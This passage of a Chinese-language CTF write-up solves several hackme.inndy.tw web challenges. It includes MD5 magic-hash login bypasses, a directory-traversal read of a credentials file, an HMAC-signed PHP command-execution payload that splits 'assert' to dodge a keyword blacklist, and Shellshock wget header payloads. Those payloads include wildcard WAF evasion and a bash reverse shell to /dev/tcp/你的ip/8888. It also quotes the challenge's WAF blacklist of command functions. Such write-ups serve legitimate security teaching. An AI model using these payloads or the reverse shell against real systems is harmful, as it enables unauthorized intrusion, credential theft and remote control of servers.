+<p>得到flag<br>其次我们尝试下能不能执行命令<br>构造<br>data = {“username”:”eval(‘echo 1;’);”}试试<br>貌似不可以<br>data = {“username”:”eval(‘phpinfo();’);”}试试<br>貌似不可以<br>本地测试下<br><img src="https://i.imgur.com/ARAmxYX.png" alt=""><br>好吧的确不行<br>必须要<br><img src="https://i.imgur.com/zPM5fKH.png" alt=""><br>这样才可以，记错了</p>
+<h3 id="14-login-as-admin-7"><a href="#14-login-as-admin-7" class="headerlink" title="14.login as admin 7"></a>14.login as admin 7</h3><p>看源码<br><img src="https://i.imgur.com/lQQtPt1.png" alt=""><br>又是需要$user === ‘admin’<br><img src="https://i.imgur.com/w5vRrVH.png" alt=""><br>乍一看感觉有两种写法<br>一种就是md5为0e开头的<br>一种是password[]xxx<br>先试试第一种<br>查下谷歌看下0e开头有哪些，随便找几个</p>
+<blockquote>
+<p>QNKCDZO<br>0e830400451993494058024219903391</p>
+</blockquote>
+<blockquote>
+<p>s878926199a<br>0e545993274517709034328855841020</p>
+</blockquote>
+<blockquote>
+<p>s155964671a<br>0e342768416822451524974117254469</p>
+</blockquote>
+<blockquote>
+<p>s214587387a<br>0e848240448830537924465865611904</p>
+</blockquote>
+<p>貌似一次就成功了<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  -d &quot;name=admin&amp;password=QNKCDZO&quot; https://hackme.inndy.tw/login7/</span><br></pre></td></tr></table></figure></p>
+<p>试试第二种<br>貌似不可以，应该是MD5函数遇到[]直接返回false了</p>
+<h3 id="15-login-as-admin-8"><a href="#15-login-as-admin-8" class="headerlink" title="15.login as admin 8"></a>15.login as admin 8</h3><p>看看源码<br><img src="https://i.imgur.com/Eo1WbAl.png" alt=""><br>貌似要满足<br>$_POST[‘name’] ！== ‘admin’<br>并且$session-&gt;is_admin<br>从上往下看<br><img src="https://i.imgur.com/CkDdW1h.png" alt=""><br>这边都是调用了Session.php的方法，我们貌似不能看到Session.php的源码这就很难受了<br>暂时没想到要怎么样<br>抓包试试看有没有提示，发现<br><img src="https://i.imgur.com/3EYEggR.png" alt=""><br>把login8cookie中b=0,改成b=1<br>貌似不行，<br>login8sha512拿去解密下<br>额，还是不行<br>嗯，我才login8sha512是login8直接sha512加密试试把b=1的也拿加密试试<br>不行的话估计就没办法了<br>额，不行<br>试试直接用url的加密看看<br>还是失败<br>这就很神奇了，按道理是可以的<br>把原先的的cookie 512加密后，额居然是不一样的。。。</p>
+<h3 id="16-login-as-admin-8-1"><a href="#16-login-as-admin-8-1" class="headerlink" title="16.login as admin 8.1"></a>16.login as admin 8.1</h3><p>不想写login as admin.jpg<br>goole了下，发现一个老哥有写,需要的直接看把</p>
+<blockquote>
+<p><a href="https://www.jianshu.com/p/6ef727966153" target="_blank" rel="noopener">https://www.jianshu.com/p/6ef727966153</a></p>
+</blockquote>
+<h3 id="17-dafuq-manager-1"><a href="#17-dafuq-manager-1" class="headerlink" title="17.    dafuq-manager 1"></a>17.    dafuq-manager 1</h3><p>不想写 Login as guest.png<br>算了还是写吧<br><img src="https://i.imgur.com/fUjyh1I.png" alt=""><br>提示使用 guest guest登入<br><img src="https://i.imgur.com/5HqO3M9.png" alt=""><br>Do you know cookie? Create a cookie named <code>help</code> with value <code>me</code>!<br><img src="https://i.imgur.com/RNDy0hC.png" alt=""></p>
+<p>很可疑阿，改成yes<br>得到flag</p>
+<h3 id="18-dafuq-manager-2"><a href="#18-dafuq-manager-2" class="headerlink" title="18.    dafuq-manager 2"></a>18.    dafuq-manager 2</h3><p>这题叫我们用admin进入<br>先 guest guest进入<br><img src="https://i.imgur.com/lcOzYLt.png" alt=""><br>下载源码<br>先看看index.php<br>发现<br><img src="https://i.imgur.com/RSb92f2.png" alt=""><br>继续跟进<br><img src="https://i.imgur.com/BADXyTr.png" alt=""><br>admin需要满足<br><img src="https://i.imgur.com/YJr2kYV.png" alt=""><br>搜下<br><img src="https://i.imgur.com/HumhOH8.png" alt=""><br>发现$GLOBALS[“permissions”]来自func_user<br>而data[6]又来自$data<br>$data又与find_user有关<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function &amp;find_user($user, $pass) &#123;</span><br><span class="line">    $cnt = count($GLOBALS[&quot;users&quot;]);</span><br><span class="line">    for ($i = 0;$i &lt; $cnt;++$i) &#123;</span><br><span class="line">        if ($user == $GLOBALS[&quot;users&quot;][$i][0]) &#123;</span><br><span class="line">            if ($pass == NULL || ($pass == $GLOBALS[&quot;users&quot;][$i][1] &amp;&amp; $GLOBALS[&quot;users&quot;][$i][7])) &#123;</span><br><span class="line">                return $GLOBALS[&quot;users&quot;][$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>即为$GLOBALS[“users”][6];<br>和/.config/.htusers.php有关<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$GLOBALS[&quot;users&quot;] = array(</span><br><span class="line">    array(&quot;guest&quot;, &quot;084e0343a0486ff05530df6c705c8bb4&quot;, &quot;./data/guest&quot;, &quot;https://game1.security.ntu.st/data/guest&quot;, 0, &quot;^.ht&quot;, 1, 1),</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
+<p>有关,但是源码泄露并没有泄露全只给出了guest的密码，这里应该是有管理员账号密码的，账号密码存在文件中所以我们不能够sql注入<br>看看有没有什么文件读取的/.config/.htusers.php的<br>读取文件函数</p>
+<blockquote>
+<p>fread<br>file_get_contents<br>fopen<br>file_arr<br>fgets<br>include<br>require<br>readfile</p>
+</blockquote>
+<p>在seay中进行自动审计<br><img src="https://i.imgur.com/PZ1K584.png" alt=""><br>fun_down有readfile<br>![](<a href="https://i.imgur.com/bAS6S9G.png" target="_blank" rel="noopener">https://i.imgur.com/bAS6S9G.png</a><br>但是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!file_in_web($abs_item) || stristr($abs_item, &apos;.php&apos;) || stristr($abs_item, &apos;config&apos;)) show_error($item . &quot;: &quot; . $GLOBALS[&quot;error_msg&quot;][&quot;accessfile&quot;]);</span><br></pre></td></tr></table></figure></p>
+<p>过滤的是否严密，把config，php都过滤了，看看还有没有什么地方可以读取的<br>我们看看第六条/core/fun_edit.php<br><img src="https://i.imgur.com/eAWnZwB.png" alt=""><br>前面两个条件第一个我们在<br>.htusers.php中可以看出这项是对的<br>第二个条件是也是符合的<br>看看<br><img src="https://i.imgur.com/eF3gL6H.png" alt=""><br>只有一个简单的过滤我们随便就可以过了<br>所以我们构造目录穿梭进行读取<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://dafuq-manager.hackme.inndy.tw/index.php?action=edit&amp;item=</span><br><span class="line">/../../../../../../var/www/webhdisk/.config/.htusers.php</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.imgur.com/vkh2zJc.png" alt=""><br>md5解码后登入得到flag</p>
+<h3 id="19-dafuq-manager-3"><a href="#19-dafuq-manager-3" class="headerlink" title="19.dafuq-manager 3"></a>19.dafuq-manager 3</h3><p>还是这题，<br>审计不动.jpg<br>mmp<br>题目叫我们get-shell<br>上题就注意这个eval了<br><img src="https://i.imgur.com/5Bre5Xj.png" alt=""><br>这题看下可不可以利用<br><img src="https://i.imgur.com/buLS911.png" alt=""><br>很明显要通过这个hash_equals的判断<br>耿总下cmd以及hmac看看<br>发现是源于<img src="https://i.imgur.com/hyOwRmW.png" alt=""><br>我们可以控制cmd以及hmac的值<br>但是必须满足<br>hash_hmac(‘sha256’, $cmd, $GLOBALS[“secret_key”]）<br>也就是说我们还需要知道 $GLOBALS[“secret_key”]是怎么来的<br>在/.config/conf.php文件中我们获取到了<br>$GLOBALS[“secret_key”] = ‘KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3’;<br>$GLOBALS[“secret_key”]的值<br>也就是说我们已经可以构造cmd命令进行命令执行了<br>但是<br><img src="https://i.imgur.com/dMWZdPy.png" alt=""><br><img src="https://i.imgur.com/UGmTBKE.png" alt=""><br>直接dir[]绕过<br>这里显示对cmd进行base64解码，然后进行waf过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;system&apos;, &apos;exec&apos;, &apos;popen&apos;, </span><br><span class="line">&apos;pcntl_exec&apos;, &apos;proc_open&apos;, </span><br><span class="line">&apos;passthru&apos;, &apos;`&apos;, &apos;eval&apos;, </span><br><span class="line">&apos;assert&apos;, &apos;preg_replace&apos;, </span><br><span class="line">&apos;create_function&apos;, &apos;include&apos;,</span><br><span class="line">&apos;require&apos;, &apos;curl&apos;</span><br></pre></td></tr></table></figure></p>
+<p>可以使用拼接的方法进行绕过<br>具体看</p>
+<blockquote>
+<p><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a></p>
+</blockquote>
+<p>先echo 1；下看下行不行<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$cmd=&apos;$a=\&apos;ass\&apos;;$b=\&apos;ert\&apos;;$c=$a.$b;$c(base64_decode(\&apos;c3lzdGVtKCdscycp\&apos;));&apos;;</span><br><span class="line">$hash=&apos;KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3&apos;;</span><br><span class="line">$hmac=hash_hmac(&apos;sha256&apos;, $cmd, $hash);</span><br><span class="line">echo sprintf(&apos;%s.%s&apos;, base64_encode($cmd), $hmac</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.imgur.com/SJTpKbU.png" alt=""><br>啥意思<br>嗯，可能要读取下flag3?<br>cat flag3<br>啥都没有<br>执行下<br>./flag3<br>没反应<br>这可能是个文件夹<br>cd flag3; ls试试<br><img src="https://i.imgur.com/DtuLg7P.png" alt=""><br>再执行下<br>./flag3/flag3<br>没反应<br>看到meow 这个应该是个编译好的c文件<br>执行下<br>./flag3/meow flag We have cat to read file, And the meow to cat flag.<br>应该是两个都要执行<br>system(‘./flag3/meow ./flag3/flag3’)<br>flag出来了</p>
+<h3 id="20-wordpress-1"><a href="#20-wordpress-1" class="headerlink" title="20.wordpress 1"></a>20.wordpress 1</h3><p>看了下提示<br>Something strange is hidding in the source code<br>这大概是用 wordpress搭建的博客，我自己使用的是hexo<br>看看源码，没有什么特殊发现，看看有没有源码泄露<br>打开robots.txt没有<br>看看博客文章<br>在第一篇文章里发现源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.dropbox.com/s/r5fk52thwh79kzw/web-security-course-game2.7z?dl=0</span><br></pre></td></tr></table></figure></p>
+<p>把源码下载下来</p>
+<blockquote>
+<p><a href="https://www.dropbox.com/h" target="_blank" rel="noopener">https://www.dropbox.com/h</a></p>
+</blockquote>
+<p>这个网站貌似挺好的，不过存储只有2G，太少了<br>自动审计+搜索下flag，发现一大堆…<br>mmp这可能要审成sb了<br>一般来说这种完整的网站，插件是一个漏洞很可能存在的地方<br><img src="https://i.imgur.com/LOGowLr.png" alt=""><br><img src="https://i.imgur.com/fbb5tmJ.png" alt=""><br>这一串sprintf是什么鬼<br>哦<br><img src="https://i.imgur.com/LbPiMsm.png" alt=""><br>试试看password[]能不能绕过<br>不能<br>只能拿去破解了<br><img src="https://i.imgur.com/FdhOBvM.png" alt=""></p>
+<blockquote>
+<p>吐槽下cMD5还是什么都要收费（）我刚刚使用的md5解密的平台chamd5</p>
+</blockquote>
+<p><img src="https://i.imgur.com/OX5JV0I.png" alt=""><br>跟进<br><img src="https://i.imgur.com/UD2y2yU.png" alt=""><br>直接x-forword-for 127.0.0.1<br>出来了</p>
+<h3 id="21-wordpress-1"><a href="#21-wordpress-1" class="headerlink" title="21.wordpress 1"></a>21.wordpress 1</h3><p><img src="https://i.imgur.com/8zSWBBR.png" alt=""></p>
+<p>上一题就注意到了<br><img src="https://i.imgur.com/Y83jQAl.png" alt=""><br>难道是第一题的flag输入进去吗？<br>好吧想多了，可能是要通过某个后门进入<br>在源码处发现，别问我怎么找到问就648<br><img src="https://i.imgur.com/4e4LZAa.png" alt=""><br>大概意思是通过post某个值获取这个值的内容？<br>嗯，文件时Seach，这大概也要search下吧</p>
+<blockquote>
+<p>view-source:<a href="https://wp.hackme.inndy.tw/page/2?s=&amp;debug=title" target="_blank" rel="noopener">https://wp.hackme.inndy.tw/page/2?s=&amp;debug=title</a></p>
+</blockquote>
+<p><img src="https://i.imgur.com/7GbcWoX.png" alt=""><br>于是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=&amp;debug=content</span><br></pre></td></tr></table></figure></p>
+<p>得到flag</p>
+<h3 id="22-webshell"><a href="#22-webshell" class="headerlink" title="22 .webshell"></a>22 .webshell</h3><p>一进去502</p>
+<blockquote>
+<p>a padding to disable MSIE and Chrome friendly error page</p>
+</blockquote>
+<p>换下火狐试试<br>怎么肥事，还是不行<br>只能跳过这题了</p>
+<h3 id="23-command-executor"><a href="#23-command-executor" class="headerlink" title="23.command-executor"></a>23.command-executor</h3><p>这题有点叼<br>跟着大佬的wp做做吧<br>进入<br>随意点点，在List files发现func与下面的php文件名字相同<br>疑似有文件包含漏洞，使用php伪协议看看能不能读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
+<p>得到index源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$pages = [</span><br><span class="line">    [&apos;man&apos;, &apos;Man&apos;],</span><br><span class="line">    [&apos;untar&apos;, &apos;Tar Tester&apos;],</span><br><span class="line">    [&apos;cmd&apos;, &apos;Cmd Exec&apos;],</span><br><span class="line">    [&apos;ls&apos;, &apos;List files&apos;],</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">function fuck($msg) &#123;</span><br><span class="line">    header(&apos;Content-Type: text/plain&apos;);</span><br><span class="line">    echo $msg;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$black_list = [</span><br><span class="line">    &apos;\/flag&apos;, &apos;\(\)\s*\&#123;\s*:;\s*\&#125;;&apos;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">function waf($a) &#123;</span><br><span class="line">    global $black_list;</span><br><span class="line">    if(is_array($a)) &#123;</span><br><span class="line">        foreach($a as $key =&gt; $val) &#123;</span><br><span class="line">            waf($key);</span><br><span class="line">            waf($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        foreach($black_list as $b) &#123;</span><br><span class="line">            if(preg_match(&quot;/$b/&quot;, $a) === 1) &#123;</span><br><span class="line">                fuck(&quot;$b detected! exit now.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">waf($_SERVER);</span><br><span class="line">waf($_GET);</span><br><span class="line">waf($_POST);</span><br><span class="line"></span><br><span class="line">function execute($cmd, $shell=&apos;bash&apos;) &#123;</span><br><span class="line">    system(sprintf(&apos;%s -c %s&apos;, $shell, escapeshellarg($cmd)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_SERVER as $key =&gt; $val) &#123;</span><br><span class="line">    if(substr($key, 0, 5) === &apos;HTTP_&apos;) &#123;</span><br><span class="line">        putenv(&quot;$key=$val&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$page = &apos;&apos;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;func&apos;])) &#123;</span><br><span class="line">    $page = $_GET[&apos;func&apos;];</span><br><span class="line">    if(strstr($page, &apos;..&apos;) !== false) &#123;</span><br><span class="line">        $page = &apos;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($page &amp;&amp; strlen($page) &gt; 0) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        include(&quot;$page.php&quot;);</span><br><span class="line">    &#125; catch (Exception $e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function render_default() &#123; ?&gt;</span><br><span class="line">&lt;p&gt;Welcome to use our developer assistant service. We provide servial useless features to make your developing life harder.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;windows-run.jpg&quot; alt=&quot;command executor&quot;&gt;</span><br><span class="line">&lt;?php &#125;</span><br><span class="line">?&gt;&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Command Executor&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;bootstrap/css/bootstrap.min.css&quot; media=&quot;all&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;comic-neue/font.css&quot; media=&quot;all&quot;&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      nav &#123; margin-bottom: 1rem; &#125;</span><br><span class="line">      img &#123; max-width: 100%; &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;Command Executor&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">      &lt;ul class=&quot;navbar-nav&quot;&gt;</span><br><span class="line">&lt;?php foreach($pages as list($file, $title)): ?&gt;</span><br><span class="line">        &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">          &lt;a class=&quot;nav-link&quot; href=&quot;index.php?func=&lt;?=$file?&gt;&quot;&gt;&lt;?=$title?&gt;&lt;/a&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line">&lt;?php endforeach; ?&gt;</span><br><span class="line">      &lt;/ul&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;&lt;?php if(is_callable(&apos;render&apos;)) render(); else render_default(); ?&gt;&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>发现可疑函数putenv<br>这里与14年的破壳漏洞有关</p>
+<blockquote>
+<p>●发布时间:2014-09-25　14时48分04秒<br>●CVE ID:CVE-2014-6271<br>●受影响版本:</p>
+</blockquote>
+<p>具体可以看</p>
+<blockquote>
+<p><a href="https://www.freebuf.com/articles/system/45390.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/45390.html</a></p>
+</blockquote>
+<p>google<br>可以发现</p>
+<blockquote>
+<p><a href="https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php" target="_blank" rel="noopener">https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php</a></p>
+</blockquote>
+<p><img src="https://i.imgur.com/EcXUBAG.png" alt=""></p>
+<p>和我们所要利用的几乎一样<br><img src="https://i.imgur.com/T5uAmTs.png" alt=""><br>尝试使用payload</p>
+<blockquote>
+<p>wget –header=”X-Exploit: () { :; }; echo Hacked” -q -O -  <a href="https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env" target="_blank" rel="noopener">https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env</a></p>
+</blockquote>
+<p>发现被过滤</p>
+<p><img src="https://i.imgur.com/6M5yDFA.png" alt=""><br>查看源码</p>
+<p><img src="https://i.imgur.com/pkPYbsE.png" alt=""><br>waf是由正则进行匹配，这种waf非常不安全<br>只要将：；中间加个空格就可以绕过<br>payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; : ; &#125;; echo Hacked&quot; -q -O -  https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env|grep Hacked</span><br></pre></td></tr></table></figure></p>
+<p>得到回显<br>通过之前目录穿梭<br>../../../<br>可以发现flag<br><img src="https://i.imgur.com/g99DGuY.png" alt=""><br>也就是说我们要读取这个flag<br>发现我们被waf过滤了<br><img src="https://i.imgur.com/qKmQXts.png" alt=""><br>这里有两种方式绕过</p>
+<blockquote>
+<p>1.拼接方式<br>2.通配符</p>
+</blockquote>
+<blockquote>
+<p>wget –header=”X-Exploit: () { : ; }; /bin/cat ../../../../../../?lag” -q -O - “<a href="https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;" target="_blank" rel="noopener">https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</a></p>
+</blockquote>
+<p>使用通配符进行代替f字母，我们成功绕过waf<br>但是flag文件需要root权限才能进行读取，<br>而flag下面flag-reader这个c文件很可疑<br>我们进行读取</p>
+<blockquote>
+<p>wget –header=”X-Exploit: () { : ; }; /bin/cat ../../../../../../?lag-reader.c” -q -O - “<a href="https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;" target="_blank" rel="noopener">https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;syscall.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    char buff[4096], rnd[16], val[16];</span><br><span class="line">    if(syscall(SYS_getrandom, &amp;rnd, sizeof(rnd), 0) != sizeof(rnd)) &#123;</span><br><span class="line">        write(1, &quot;Not enough random\n&quot;, 18);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setuid(1337);</span><br><span class="line">    seteuid(1337);</span><br><span class="line">    alarm(1);</span><br><span class="line">    write(1, &amp;rnd, sizeof(rnd));</span><br><span class="line">    read(0, &amp;val, sizeof(val));</span><br><span class="line"></span><br><span class="line">    if(memcmp(rnd, val, sizeof(rnd)) == 0) &#123;</span><br><span class="line">        int fd = open(argv[1], O_RDONLY);</span><br><span class="line">        if(fd &gt; 0) &#123;</span><br><span class="line">            int s = read(fd, buff, 1024);</span><br><span class="line">            if(s &gt; 0) &#123;</span><br><span class="line">                write(1, buff, s);</span><br><span class="line">            &#125;</span><br><span class="line">            close(fd);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            write(1, &quot;Can not open file\n&quot;, 18);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        write(1, &quot;Wrong response\n&quot;, 16);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>大致1秒之内把他输出的再输入回去，就可以打出文件内容<br>此时我们的思路很简单，运行这个c<br>算了，直接拿shell好了<br>shell反弹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=&quot;X-Exploit: () &#123; : ; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/你的ip/8888 0&gt;&amp;1&quot; -q -O - &quot;https://command-executor.hackme.inndy.tw/index.php?func=cmd&amp;cmd=env&quot;</span><br></pre></td></tr></table></figure></p>
+<p>选择了linux下的重定向，我们将输出写到某个文件中，再自动输入即可，这样即可达到目的<br>我们先去探索可写目录，容易发现/var/tmp具有写权限<br>直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag-reader flag &gt; /var/tmp/skyflag &lt; /var/tmp/skyflag</span><br></pre></td></tr></table></figure></p>
+<p>然后cat /var/tmp/skyflag就可以得到flag了</p>
+<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><blockquote>
+<p><a href="http://www.northity.com/2018/10/23/XSSme%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">http://www.northity.com/2018/10/23/XSSme%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</a></p>
+</blockquote>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
+<p><a href="https://skysec.top/2018/01/07/hackme%E7%BD%91%E7%AB%99%E8%BE%B9%E5%81%9A%E8%BE%B9%E8%AE%B0%E5%BD%95/#wordpress-1" target="_blank" rel="noopener">https://skysec.top/2018/01/07/hackme%E7%BD%91%E7%AB%99%E8%BE%B9%E5%81%9A%E8%BE%B9%E8%AE%B0%E5%BD%95/#wordpress-1</a></p>
+</blockquote>
+
+      
+    </div>
+    
+    
+    
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
